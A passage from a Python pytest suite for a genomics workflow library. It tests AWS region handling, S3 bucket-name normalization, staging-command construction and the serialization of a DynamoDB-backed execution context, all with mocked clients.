        mock_table.update_item.assert_called_once()
        call_args = mock_table.update_item.call_args

        # Check that headnode_analysis_path is in the update expression
        update_expr = call_args.kwargs["UpdateExpression"]
        expr_values = call_args.kwargs["ExpressionAttributeValues"]

        assert "headnode_analysis_path" in update_expr
        assert ":analysis_path" in expr_values
        assert expr_values[":analysis_path"] == "/fsx/analysis_results/ubuntu/test-ws-001/daylily-omics-analysis"

    def test_update_with_multiple_fields_including_path(self, mock_dynamodb):
        """Test updating multiple fields including headnode_analysis_path."""
        from daylib.workset_state_db import WorksetStateDB

        db = WorksetStateDB(
            table_name="test-worksets",
            region="us-west-2",
            profile=None,
        )

        mock_table = mock_dynamodb["table"]
        mock_table.update_item.return_value = {}

        db.update_execution_environment(
            workset_id="test-ws-002",
            cluster_name="test-cluster",
            headnode_ip="10.0.1.100",
            headnode_analysis_path="/fsx/analysis",
        )

        mock_table.update_item.assert_called_once()
        call_args = mock_table.update_item.call_args
        update_expr = call_args.kwargs["UpdateExpression"]
        expr_values = call_args.kwargs["ExpressionAttributeValues"]

        # All fields should be present
        assert "execution_cluster_name" in update_expr
        assert "execution_headnode_ip" in update_expr
        assert "headnode_analysis_path" in update_expr
        assert ":exec_cluster" in expr_values
        assert ":exec_ip" in expr_values
        assert ":analysis_path" in expr_values


class TestStageReferenceBucket:
    """Tests for _stage_reference_bucket region substitution."""

    @pytest.fixture
    def mock_monitor(self):
        """Create a mock monitor with config for testing."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.config = MagicMock()
        return monitor

    def test_returns_configured_bucket_without_region(self, mock_monitor):
        """Test that configured bucket is returned as-is when no region specified."""
        mock_monitor.config.pipeline.reference_bucket = "s3://my-bucket/"

        result = mock_monitor._stage_reference_bucket()

        assert result == "s3://my-bucket/"

    def test_adds_trailing_slash(self, mock_monitor):
        """Test that trailing slash is added if missing."""
        mock_monitor.config.pipeline.reference_bucket = "s3://my-bucket"

        result = mock_monitor._stage_reference_bucket()

        assert result == "s3://my-bucket/"

    def test_substitutes_region_placeholder(self, mock_monitor):
        """Test that {region} placeholder is substituted."""
        mock_monitor.config.pipeline.reference_bucket = "s3://bucket-{region}/"

        result = mock_monitor._stage_reference_bucket(region="eu-central-1")

        assert result == "s3://bucket-eu-central-1/"

    def test_substitutes_region_suffix_us_west_2_to_eu_central_1(self, mock_monitor):
        """Test region suffix substitution from us-west-2 to eu-central-1."""
        mock_monitor.config.pipeline.reference_bucket = "s3://lsmc-dayoa-omics-analysis-us-west-2/"

        result = mock_monitor._stage_reference_bucket(region="eu-central-1")

        assert result == "s3://lsmc-dayoa-omics-analysis-eu-central-1/"

    def test_substitutes_region_suffix_eu_central_1_to_us_west_2(self, mock_monitor):
        """Test region suffix substitution from eu-central-1 to us-west-2."""
        mock_monitor.config.pipeline.reference_bucket = "s3://lsmc-dayoa-omics-analysis-eu-central-1/"

        result = mock_monitor._stage_reference_bucket(region="us-west-2")

        assert result == "s3://lsmc-dayoa-omics-analysis-us-west-2/"

    def test_substitutes_region_suffix_us_east_1(self, mock_monitor):
        """Test region suffix substitution to us-east-1."""
        mock_monitor.config.pipeline.reference_bucket = "s3://bucket-us-west-2/"

        result = mock_monitor._stage_reference_bucket(region="us-east-1")

        assert result == "s3://bucket-us-east-1/"

    def test_substitutes_region_suffix_ap_south_1(self, mock_monitor):
        """Test region suffix substitution to ap-south-1."""
        mock_monitor.config.pipeline.reference_bucket = "s3://bucket-us-west-2/"

        result = mock_monitor._stage_reference_bucket(region="ap-south-1")

        assert result == "s3://bucket-ap-south-1/"

    def test_no_substitution_when_region_matches(self, mock_monitor):
        """Test no substitution when target region matches bucket region."""
        mock_monitor.config.pipeline.reference_bucket = "s3://bucket-us-west-2/"

        result = mock_monitor._stage_reference_bucket(region="us-west-2")

        assert result == "s3://bucket-us-west-2/"

    def test_no_substitution_for_non_regional_bucket(self, mock_monitor):
        """Test no substitution for bucket without region suffix."""
        mock_monitor.config.pipeline.reference_bucket = "s3://my-generic-bucket/"

        result = mock_monitor._stage_reference_bucket(region="eu-central-1")

        assert result == "s3://my-generic-bucket/"

    def test_raises_error_when_not_configured(self, mock_monitor):
        """Test MonitorError raised when reference_bucket not configured."""
        from daylib.workset_monitor import MonitorError

        mock_monitor.config.pipeline.reference_bucket = None

        with pytest.raises(MonitorError, match="pipeline.reference_bucket must be configured"):
            mock_monitor._stage_reference_bucket()

    def test_raises_error_for_empty_string(self, mock_monitor):
        """Test MonitorError raised for empty string."""
        from daylib.workset_monitor import MonitorError

        mock_monitor.config.pipeline.reference_bucket = ""

        with pytest.raises(MonitorError, match="pipeline.reference_bucket must be configured"):
            mock_monitor._stage_reference_bucket()


class TestStageSamplesMultiRegion:
    """Tests for _stage_samples multi-region support."""

    @pytest.fixture
    def mock_monitor(self):
        """Create a mock monitor with required attributes for staging."""
        from daylib.workset_monitor import WorksetMonitor
        import tempfile
        from pathlib import Path

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.config = MagicMock()
        monitor.config.aws.profile = "test-profile"
        monitor.config.aws.region = "us-west-2"
        monitor.config.pipeline.reference_bucket = "s3://bucket-us-west-2/"
        monitor.config.pipeline.stage_command = (
            "./bin/stage --profile {profile} --region {region} "
            "--reference-bucket {reference_bucket} --config-dir {output_dir} {analysis_samples}"
        )
        monitor.config.pipeline.ssh_identity_file = "~/.ssh/key.pem"
        monitor.config.pipeline.ssh_user = "ubuntu"
        monitor.config.pipeline.ssh_extra_args = []

        # Mock methods
        monitor._stage_artifacts = {}
        monitor._relative_manifest_argument = MagicMock(return_value="manifest.tsv")

        # Use temp directory for output
        tmpdir = tempfile.mkdtemp()
        monitor._local_state_dir = MagicMock(return_value=Path(tmpdir))

        return monitor

    def test_uses_cluster_region_in_command(self, mock_monitor):
        """Test that cluster region is used in staging command."""
        mock_monitor._run_monitored_command = MagicMock()
        mock_monitor._run_monitored_command.return_value = MagicMock(
            stdout="Remote FSx stage directory: /fsx/data/staged/remote_stage_123\nStaged files (1):\n  /fsx/data/staged/remote_stage_123/sample.fq.gz",
            stderr="",
        )
        mock_monitor._parse_stage_samples_output = MagicMock()

        workset = MagicMock()
        workset.name = "test-workset"
        manifest_path = MagicMock()

        mock_monitor._stage_samples(workset, manifest_path, "euc1a-jem", region="eu-central-1")

        # Verify the command was called with correct region
        call_args = mock_monitor._run_monitored_command.call_args
        cmd = call_args[0][1]  # Second positional arg is the command string

        assert "--region eu-central-1" in cmd
        assert "--reference-bucket s3://bucket-eu-central-1/" in cmd

    def test_uses_config_region_when_none_provided(self, mock_monitor):
        """Test that config region is used when no region parameter provided."""
        mock_monitor._run_monitored_command = MagicMock()
        mock_monitor._run_monitored_command.return_value = MagicMock(stdout="", stderr="")
        mock_monitor._parse_stage_samples_output = MagicMock()

        workset = MagicMock()
        workset.name = "test-workset"
        manifest_path = MagicMock()

        mock_monitor._stage_samples(workset, manifest_path, "usw2d-B", region=None)

        call_args = mock_monitor._run_monitored_command.call_args
        cmd = call_args[0][1]

        assert "--region us-west-2" in cmd
        assert "--reference-bucket s3://bucket-us-west-2/" in cmd

    def test_different_regions_produce_different_commands(self, mock_monitor):
        """Test that different regions produce different staging commands."""
        mock_monitor._run_monitored_command = MagicMock()
        mock_monitor._run_monitored_command.return_value = MagicMock(stdout="", stderr="")
        mock_monitor._parse_stage_samples_output = MagicMock()

        workset = MagicMock()
        workset.name = "test-workset"
        manifest_path = MagicMock()

        # Stage to us-west-2
        mock_monitor._stage_samples(workset, manifest_path, "usw2d-B", region="us-west-2")
        usw2_cmd = mock_monitor._run_monitored_command.call_args[0][1]

        # Stage to eu-central-1
        mock_monitor._stage_samples(workset, manifest_path, "euc1a-jem", region="eu-central-1")
        euc1_cmd = mock_monitor._run_monitored_command.call_args[0][1]

        # Stage to ap-south-1
        mock_monitor._stage_samples(workset, manifest_path, "aps1-cluster", region="ap-south-1")
        aps1_cmd = mock_monitor._run_monitored_command.call_args[0][1]

        # Verify each has correct region
        assert "--region us-west-2" in usw2_cmd
        assert "--region eu-central-1" in euc1_cmd
        assert "--region ap-south-1" in aps1_cmd

        # Verify each has correct bucket
        assert "bucket-us-west-2" in usw2_cmd
        assert "bucket-eu-central-1" in euc1_cmd
        assert "bucket-ap-south-1" in aps1_cmd


# ========== Tests for Phase 1 bucket normalization fixes ==========


class TestBucketNormalizationAtIngress:
    """Test bucket names are normalized (s3:// prefix stripped) at all ingress points."""

    def test_init_normalizes_bucket_with_s3_prefix(self, mock_state_db, mock_s3_client):
        """Test __init__ normalizes bucket with s3:// prefix."""
        integration = WorksetIntegration(
            state_db=mock_state_db,
            s3_client=mock_s3_client,
            bucket="s3://my-bucket-with-prefix",
            prefix="worksets/",
        )
        assert integration.bucket == "my-bucket-with-prefix"

    def test_register_workset_normalizes_bucket_param(self, integration, mock_state_db, mock_s3_client):
        """Test register_workset normalizes bucket parameter with s3:// prefix."""
        result = integration.register_workset(
            workset_id="test-ws-norm",
            bucket="s3://bucket-with-prefix",
            prefix="worksets/test/",
            priority="normal",
            metadata={"samples": []},
            write_s3=False,
            write_dynamodb=True,
        )

        assert result is True
        call_kwargs = mock_state_db.register_workset.call_args.kwargs
        assert call_kwargs["bucket"] == "bucket-with-prefix"

    def test_update_state_normalizes_bucket_param(self, integration, mock_state_db, mock_s3_client):
        """Test update_state normalizes bucket parameter with s3:// prefix."""
        integration.update_state(
            workset_id="test-ws-001",
            new_state="in_progress",
            reason="Starting processing",
            bucket="s3://bucket-with-prefix",
        )

        # Should use normalized bucket for S3 operations
        # The method writes sentinel to S3, check the put_object call
        if mock_s3_client.put_object.called:
            call_kwargs = mock_s3_client.put_object.call_args.kwargs
            assert call_kwargs["Bucket"] == "bucket-with-prefix"

    def test_acquire_lock_normalizes_bucket_param(self, integration, mock_state_db, mock_s3_client):
        """Test acquire_lock normalizes bucket parameter with s3:// prefix."""
        mock_state_db.acquire_lock.return_value = True

        result = integration.acquire_lock(
            workset_id="test-ws-001",
            owner_id="test-processor",
            bucket="s3://bucket-with-prefix",
        )

        assert result is True
        # Verify S3 sentinel written to normalized bucket
        if mock_s3_client.put_object.called:
            call_kwargs = mock_s3_client.put_object.call_args.kwargs
            assert call_kwargs["Bucket"] == "bucket-with-prefix"

    def test_release_lock_normalizes_bucket_param(self, integration, mock_state_db, mock_s3_client):
        """Test release_lock normalizes bucket parameter with s3:// prefix."""
        mock_state_db.release_lock.return_value = True

        result = integration.release_lock(
            workset_id="test-ws-001",
            owner_id="test-processor",
            bucket="s3://bucket-with-prefix",
        )

        assert result is True

    def test_sync_dynamodb_to_s3_normalizes_bucket_from_workset(
        self, integration, mock_state_db, mock_s3_client
    ):
        """Test sync_dynamodb_to_s3 normalizes bucket from workset data."""
        mock_state_db.get_workset.return_value = {
            "workset_id": "sync-ws",
            "state": "ready",
            "bucket": "s3://bucket-with-prefix",  # Bucket with s3:// prefix
            "prefix": "worksets/sync-ws/",
            "metadata": {"samples": []},
        }

        result = integration.sync_dynamodb_to_s3("sync-ws")

        assert result is True
        # Verify S3 operations use normalized bucket
        if mock_s3_client.put_object.called:
            call_kwargs = mock_s3_client.put_object.call_args.kwargs
            assert call_kwargs["Bucket"] == "bucket-with-prefix"

    def test_bucket_with_path_components_normalized(self, mock_state_db, mock_s3_client):
        """Test bucket with path components (s3://bucket/path) extracts just bucket."""
        integration = WorksetIntegration(
            state_db=mock_state_db,
            s3_client=mock_s3_client,
            bucket="s3://my-bucket/some/path",
            prefix="worksets/",
        )
        assert integration.bucket == "my-bucket"

    def test_bucket_without_prefix_unchanged(self, mock_state_db, mock_s3_client):
        """Test bucket without s3:// prefix is unchanged."""
        integration = WorksetIntegration(
            state_db=mock_state_db,
            s3_client=mock_s3_client,
            bucket="plain-bucket-name",
            prefix="worksets/",
        )
        assert integration.bucket == "plain-bucket-name"


# ========== Tests for Phase 1 region threading fixes ==========


class TestRegionThreadingInExportResults:
    """Test region parameter is correctly threaded through _export_results."""

    def test_export_results_uses_passed_region(self):
        """Test _export_results uses passed region instead of config default."""
        from daylib.workset_monitor import WorksetMonitor
        from unittest.mock import MagicMock, patch
        from pathlib import PurePosixPath, Path

        # Create minimal monitor instance
        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.config = MagicMock()
        monitor.config.aws.region = "us-west-2"  # Default region
        monitor.config.aws.profile = None
        monitor.config.pipeline.export_command = (
            "echo cluster={cluster} region={region} target={target_uri}"
        )
        monitor._local_state_dir = MagicMock(return_value=Path("/tmp/test"))
        monitor._resolve_workdir_name = MagicMock(return_value="test-workdir")
        monitor._run_monitored_command = MagicMock()

        # Mock workset
        workset = MagicMock()
        workset.name = "test-ws"
        workset.bucket = "test-bucket"
        workset.prefix = "worksets/test/"

        # Mock Path.exists to return False (no fsx_export.yaml)
        with patch.object(Path, "exists", return_value=False):
            from daylib.workset_monitor import MonitorError
            try:
                monitor._export_results(
                    workset=workset,
                    cluster_name="test-cluster",
                    target_uri="s3://export-bucket/results/",
                    pipeline_dir=PurePosixPath("/fsx/pipeline"),
                    region="eu-central-1",  # Pass EU region explicitly
                )
            except MonitorError:
                pass  # Expected - no fsx_export.yaml

        # Verify the command was called with EU region, not default US region
        monitor._run_monitored_command.assert_called_once()
        call_args = monitor._run_monitored_command.call_args
        command = call_args[0][1]  # Second positional arg is the command
        assert "region='eu-central-1'" in command or "region=eu-central-1" in command

    def test_export_results_falls_back_to_config_region(self):
        """Test _export_results falls back to config region when none passed."""
        from daylib.workset_monitor import WorksetMonitor
        from unittest.mock import MagicMock, patch
        from pathlib import PurePosixPath, Path

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor.config = MagicMock()
        monitor.config.aws.region = "us-west-2"
        monitor.config.aws.profile = None
        monitor.config.pipeline.export_command = (
            "echo cluster={cluster} region={region} target={target_uri}"
        )
        monitor._local_state_dir = MagicMock(return_value=Path("/tmp/test"))
        monitor._resolve_workdir_name = MagicMock(return_value="test-workdir")
        monitor._run_monitored_command = MagicMock()

        workset = MagicMock()
        workset.name = "test-ws"
        workset.bucket = "test-bucket"
        workset.prefix = "worksets/test/"

        with patch.object(Path, "exists", return_value=False):
            from daylib.workset_monitor import MonitorError
            try:
                monitor._export_results(
                    workset=workset,
                    cluster_name="test-cluster",
                    target_uri="s3://export-bucket/results/",
                    pipeline_dir=PurePosixPath("/fsx/pipeline"),
                    # No region passed - should use config default
                )
            except MonitorError:
                pass

        monitor._run_monitored_command.assert_called_once()
        call_args = monitor._run_monitored_command.call_args
        command = call_args[0][1]
        assert "region='us-west-2'" in command or "region=us-west-2" in command


class TestCleanupPipelineDirectoryRegion:
    """Test region parameter is correctly threaded through _cleanup_pipeline_directory."""

    def test_cleanup_pipeline_directory_passes_region(self):
        """Test _cleanup_pipeline_directory passes region to headnode command."""
        from daylib.workset_monitor import WorksetMonitor
        from unittest.mock import MagicMock
        from pathlib import PurePosixPath

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        monitor._run_headnode_monitored_command = MagicMock()
        monitor._clear_pipeline_location = MagicMock()

        workset = MagicMock()
        workset.name = "test-ws"

        monitor._cleanup_pipeline_directory(
            workset=workset,
            cluster_name="test-cluster",
            pipeline_dir=PurePosixPath("/fsx/pipeline/test"),
            region="eu-central-1",
        )

        monitor._run_headnode_monitored_command.assert_called_once()
        call_kwargs = monitor._run_headnode_monitored_command.call_args.kwargs
        assert call_kwargs.get("region") == "eu-central-1"


# ========== Tests for Phase 1H: RegionAwareS3Client ==========


class TestRegionAwareS3Client:
    """Tests for the RegionAwareS3Client that handles cross-region S3 operations."""

    def test_normalize_bucket_name_strips_s3_prefix(self):
        """Test that normalize_bucket_name strips s3:// prefix."""
        from daylib.s3_utils import normalize_bucket_name

        assert normalize_bucket_name("s3://my-bucket") == "my-bucket"
        assert normalize_bucket_name("s3://my-bucket/") == "my-bucket"
        assert normalize_bucket_name("my-bucket") == "my-bucket"
        # Empty string returns None
        assert normalize_bucket_name("") is None
        assert normalize_bucket_name(None) is None

    def test_client_initialization(self):
        """Test RegionAwareS3Client initializes with default region."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            mock_session = MagicMock()
            mock_client = MagicMock()
            mock_boto3.Session.return_value = mock_session
            mock_session.client.return_value = mock_client

            client = RegionAwareS3Client(default_region="us-west-2")

            assert client.default_region == "us-west-2"
            # Verifies Session was called with region_name
            mock_boto3.Session.assert_called_with(region_name="us-west-2")
            mock_session.client.assert_called_with("s3")

    def test_client_initialization_with_profile(self):
        """Test RegionAwareS3Client initializes with AWS profile."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            mock_session = MagicMock()
            mock_client = MagicMock()
            mock_boto3.Session.return_value = mock_session
            mock_session.client.return_value = mock_client

            client = RegionAwareS3Client(
                default_region="eu-central-1",
                profile="my-profile",
            )

            assert client.profile == "my-profile"
            # Both region and profile are passed to Session
            mock_boto3.Session.assert_called_with(
                region_name="eu-central-1",
                profile_name="my-profile"
            )

    def test_get_bucket_region_us_east_1_returns_none(self):
        """Test that us-east-1 buckets return 'us-east-1' (GetBucketLocation returns None)."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            mock_session = MagicMock()
            mock_client = MagicMock()
            mock_boto3.Session.return_value = mock_session
            mock_session.client.return_value = mock_client

            # GetBucketLocation returns None for us-east-1
            mock_client.get_bucket_location.return_value = {"LocationConstraint": None}

            client = RegionAwareS3Client(default_region="us-west-2")
            region = client.get_bucket_region("us-east-1-bucket")

            assert region == "us-east-1"
            mock_client.get_bucket_location.assert_called_once_with(Bucket="us-east-1-bucket")

    def test_get_bucket_region_caches_result(self):
        """Test that bucket region is cached after first lookup."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            mock_session = MagicMock()
            mock_client = MagicMock()
            mock_boto3.Session.return_value = mock_session
            mock_session.client.return_value = mock_client

            mock_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}

            client = RegionAwareS3Client(default_region="us-west-2")

            # First call should query S3
            region1 = client.get_bucket_region("eu-bucket")
            assert region1 == "eu-central-1"
            assert mock_client.get_bucket_location.call_count == 1

            # Second call should use cache
            region2 = client.get_bucket_region("eu-bucket")
            assert region2 == "eu-central-1"
            assert mock_client.get_bucket_location.call_count == 1  # No additional call

    def test_get_bucket_region_normalizes_bucket_name(self):
        """Test that bucket name is normalized before region lookup."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            mock_session = MagicMock()
            mock_client = MagicMock()
            mock_boto3.Session.return_value = mock_session
            mock_session.client.return_value = mock_client

            mock_client.get_bucket_location.return_value = {"LocationConstraint": "us-west-2"}

            client = RegionAwareS3Client(default_region="us-west-2")
            region = client.get_bucket_region("s3://my-bucket-with-prefix")

            mock_client.get_bucket_location.assert_called_once_with(Bucket="my-bucket-with-prefix")

    def test_get_client_for_bucket_creates_regional_client(self):
        """Test that get_client_for_bucket creates a client for bucket's region."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            us_west_2_client = MagicMock(name="us-west-2-client")
            eu_central_1_client = MagicMock(name="eu-central-1-client")

            # Session is created with region_name kwarg, so we need to track that
            def session_factory(region_name=None, profile_name=None):
                mock_session = MagicMock()
                if region_name == "eu-central-1":
                    mock_session.client.return_value = eu_central_1_client
                else:
                    mock_session.client.return_value = us_west_2_client
                return mock_session

            mock_boto3.Session.side_effect = session_factory

            # Default client is used for GetBucketLocation
            us_west_2_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}

            client = RegionAwareS3Client(default_region="us-west-2")
            regional_client = client.get_client_for_bucket("eu-bucket")

            assert regional_client is eu_central_1_client

    def test_list_objects_v2_uses_regional_client(self):
        """Test that list_objects_v2 uses the correct regional client."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            default_client = MagicMock(name="default-client")
            eu_client = MagicMock(name="eu-client")

            def session_factory(region_name=None, profile_name=None):
                mock_session = MagicMock()
                if region_name == "eu-central-1":
                    mock_session.client.return_value = eu_client
                else:
                    mock_session.client.return_value = default_client
                return mock_session

            mock_boto3.Session.side_effect = session_factory
            default_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}
            eu_client.list_objects_v2.return_value = {"Contents": [], "KeyCount": 0}

            client = RegionAwareS3Client(default_region="us-west-2")
            client.list_objects_v2(Bucket="s3://eu-bucket", Prefix="test/")

            eu_client.list_objects_v2.assert_called_once_with(Bucket="eu-bucket", Prefix="test/")

    def test_put_object_uses_regional_client(self):
        """Test that put_object uses the correct regional client."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            default_client = MagicMock(name="default-client")
            eu_client = MagicMock(name="eu-client")

            def session_factory(region_name=None, profile_name=None):
                mock_session = MagicMock()
                if region_name == "eu-central-1":
                    mock_session.client.return_value = eu_client
                else:
                    mock_session.client.return_value = default_client
                return mock_session

            mock_boto3.Session.side_effect = session_factory
            default_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}

            client = RegionAwareS3Client(default_region="us-west-2")
            client.put_object(Bucket="eu-bucket", Key="test.txt", Body=b"content")

            eu_client.put_object.assert_called_once_with(Bucket="eu-bucket", Key="test.txt", Body=b"content")

    def test_get_paginator_returns_region_aware_paginator(self):
        """Test that get_paginator returns a RegionAwarePaginator."""
        from daylib.s3_utils import RegionAwareS3Client, _RegionAwarePaginator

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            mock_session = MagicMock()
            mock_client = MagicMock()
            mock_boto3.Session.return_value = mock_session
            mock_session.client.return_value = mock_client

            client = RegionAwareS3Client(default_region="us-west-2")
            paginator = client.get_paginator("list_objects_v2")

            assert isinstance(paginator, _RegionAwarePaginator)

    def test_exceptions_proxy_exposes_s3_exceptions(self):
        """Test that exceptions proxy allows access to S3 client exceptions."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            mock_session = MagicMock()
            mock_client = MagicMock()
            mock_boto3.Session.return_value = mock_session
            mock_session.client.return_value = mock_client

            # Create mock exception classes
            mock_client.exceptions = MagicMock()
            mock_client.exceptions.NoSuchKey = type("NoSuchKey", (Exception,), {})
            mock_client.exceptions.NoSuchBucket = type("NoSuchBucket", (Exception,), {})

            client = RegionAwareS3Client(default_region="us-west-2")

            # Should be able to access exception types
            assert hasattr(client.exceptions, "NoSuchKey")
            assert hasattr(client.exceptions, "NoSuchBucket")

    def test_invalidate_bucket_cache_removes_cached_region(self):
        """Test that invalidate_bucket_cache removes a bucket from cache."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            mock_session = MagicMock()
            mock_client = MagicMock()
            mock_boto3.Session.return_value = mock_session
            mock_session.client.return_value = mock_client

            mock_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}

            client = RegionAwareS3Client(default_region="us-west-2")

            # Cache the region
            client.get_bucket_region("my-bucket")
            assert "my-bucket" in client._bucket_regions

            # Invalidate
            client.invalidate_bucket_cache("my-bucket")
            assert "my-bucket" not in client._bucket_regions


class TestRegionAwarePaginator:
    """Tests for the _RegionAwarePaginator class."""

    def test_paginate_uses_regional_client(self):
        """Test that paginate uses the correct regional client for the bucket."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            default_client = MagicMock(name="default-client")
            eu_client = MagicMock(name="eu-client")
            mock_paginator = MagicMock()

            def session_factory(region_name=None, profile_name=None):
                mock_session = MagicMock()
                if region_name == "eu-central-1":
                    mock_session.client.return_value = eu_client
                else:
                    mock_session.client.return_value = default_client
                return mock_session

            mock_boto3.Session.side_effect = session_factory
            default_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}
            eu_client.get_paginator.return_value = mock_paginator
            mock_paginator.paginate.return_value = iter([{"Contents": []}])

            client = RegionAwareS3Client(default_region="us-west-2")
            paginator = client.get_paginator("list_objects_v2")

            # Consume the iterator
            list(paginator.paginate(Bucket="s3://eu-bucket", Prefix="test/"))

            eu_client.get_paginator.assert_called_once_with("list_objects_v2")
            mock_paginator.paginate.assert_called_once_with(Bucket="eu-bucket", Prefix="test/")

    def test_paginate_normalizes_bucket_name(self):
        """Test that paginate normalizes bucket names with s3:// prefix."""
        from daylib.s3_utils import RegionAwareS3Client

        with patch("daylib.s3_utils.boto3") as mock_boto3:
            mock_session = MagicMock()
            mock_client = MagicMock()
            mock_paginator = MagicMock()
            mock_boto3.Session.return_value = mock_session
            mock_session.client.return_value = mock_client

            mock_client.get_bucket_location.return_value = {"LocationConstraint": "us-west-2"}
            mock_client.get_paginator.return_value = mock_paginator
            mock_paginator.paginate.return_value = iter([{"Contents": []}])

            client = RegionAwareS3Client(default_region="us-west-2")
            paginator = client.get_paginator("list_objects_v2")

            list(paginator.paginate(Bucket="s3://my-bucket/", Prefix="prefix/"))

            # Should be called with normalized bucket name
            mock_paginator.paginate.assert_called_once_with(Bucket="my-bucket", Prefix="prefix/")


class TestExecutionContext:
    """Tests for the ExecutionContext dataclass."""

    def test_execution_context_to_dict(self):
        """Test ExecutionContext serialization to dictionary."""
        from daylib.workset_monitor import ExecutionContext

        ctx = ExecutionContext(
            cluster_name="usw2-test-cluster",
            cluster_region="us-west-2",
            execution_bucket="test-bucket",
            workset_prefix="worksets/ws-001/",
            ssh_key_path="/home/user/.ssh/key.pem",
            reference_bucket="ref-bucket",
            export_s3_uri="s3://export-bucket/results/",
            headnode_ip="10.0.1.100",
            pipeline_dir="/fsx/analysis_results/ubuntu/ws-001/daylily",
        )

        result = ctx.to_dict()

        assert result["cluster_name"] == "usw2-test-cluster"
        assert result["cluster_region"] == "us-west-2"
        assert result["execution_bucket"] == "test-bucket"
        assert result["workset_prefix"] == "worksets/ws-001/"
        assert result["ssh_key_path"] == "/home/user/.ssh/key.pem"
        assert result["reference_bucket"] == "ref-bucket"
        assert result["export_s3_uri"] == "s3://export-bucket/results/"
        assert result["headnode_ip"] == "10.0.1.100"
        assert result["pipeline_dir"] == "/fsx/analysis_results/ubuntu/ws-001/daylily"

    def test_execution_context_from_dict(self):
        """Test ExecutionContext deserialization from dictionary."""
        from daylib.workset_monitor import ExecutionContext

        data = {
            "cluster_name": "euc1-prod-cluster",
            "cluster_region": "eu-central-1",
            "execution_bucket": "eu-bucket",
            "workset_prefix": "worksets/eu-ws/",
            "ssh_key_path": "/home/user/.ssh/eu-key.pem",
            "reference_bucket": "eu-ref-bucket",
            "export_s3_uri": "s3://eu-export/results/",
            "headnode_ip": "10.0.2.100",
            "pipeline_dir": "/fsx/analysis_results/ubuntu/eu-ws/daylily",
        }

        ctx = ExecutionContext.from_dict(data)

        assert ctx.cluster_name == "euc1-prod-cluster"
        assert ctx.cluster_region == "eu-central-1"
        assert ctx.execution_bucket == "eu-bucket"
        assert ctx.workset_prefix == "worksets/eu-ws/"
        assert ctx.ssh_key_path == "/home/user/.ssh/eu-key.pem"
        assert ctx.reference_bucket == "eu-ref-bucket"
        assert ctx.export_s3_uri == "s3://eu-export/results/"
        assert ctx.headnode_ip == "10.0.2.100"
        assert ctx.pipeline_dir == "/fsx/analysis_results/ubuntu/eu-ws/daylily"

    def test_execution_context_from_dict_with_optional_fields_missing(self):
        """Test ExecutionContext deserialization with optional fields omitted."""
        from daylib.workset_monitor import ExecutionContext

        data = {
            "cluster_name": "test-cluster",
            "cluster_region": "us-east-1",
            "execution_bucket": "bucket",
            "workset_prefix": "ws/",
        }

        ctx = ExecutionContext.from_dict(data)

        assert ctx.cluster_name == "test-cluster"
        assert ctx.cluster_region == "us-east-1"
        assert ctx.execution_bucket == "bucket"
        assert ctx.workset_prefix == "ws/"
        assert ctx.ssh_key_path is None
        assert ctx.reference_bucket is None
        assert ctx.export_s3_uri is None
        assert ctx.headnode_ip is None
        assert ctx.pipeline_dir is None

    def test_execution_context_roundtrip(self):
        """Test that to_dict/from_dict roundtrip preserves data."""
        from daylib.workset_monitor import ExecutionContext

        original = ExecutionContext(
            cluster_name="roundtrip-cluster",
            cluster_region="ap-southeast-1",
            execution_bucket="ap-bucket",
            workset_prefix="worksets/ap-ws/",
            ssh_key_path="/home/.ssh/ap.pem",
            export_s3_uri="s3://ap-export/",
        )

        reconstructed = ExecutionContext.from_dict(original.to_dict())

        assert reconstructed.cluster_name == original.cluster_name
        assert reconstructed.cluster_region == original.cluster_region
        assert reconstructed.execution_bucket == original.execution_bucket
        assert reconstructed.workset_prefix == original.workset_prefix
        assert reconstructed.ssh_key_path == original.ssh_key_path
        assert reconstructed.export_s3_uri == original.export_s3_uri


class TestExecutionContextDynamoDB:
    """Tests for ExecutionContext storage in DynamoDB."""

    def test_set_execution_context_stores_correctly(self):
        """Test that set_execution_context stores the context in DynamoDB."""
        with patch("daylib.workset_state_db.boto3.Session") as mock_session:
            mock_resource = MagicMock()
            mock_table = MagicMock()
            mock_session.return_value.resource.return_value = mock_resource
            mock_resource.Table.return_value = mock_table

            from daylib.workset_state_db import WorksetStateDB

            db = WorksetStateDB(table_name="test-table", region="us-west-2")

            ctx_dict = {
                "cluster_name": "test-cluster",
                "cluster_region": "us-west-2",
                "execution_bucket": "test-bucket",
                "workset_prefix": "worksets/ws/",
                "ssh_key_path": "/home/.ssh/key.pem",
            }

            result = db.set_execution_context("ws-001", ctx_dict)

            assert result is True
            mock_table.update_item.assert_called_once()
            call_args = mock_table.update_item.call_args
            assert call_args[1]["Key"] == {"workset_id": "ws-001"}
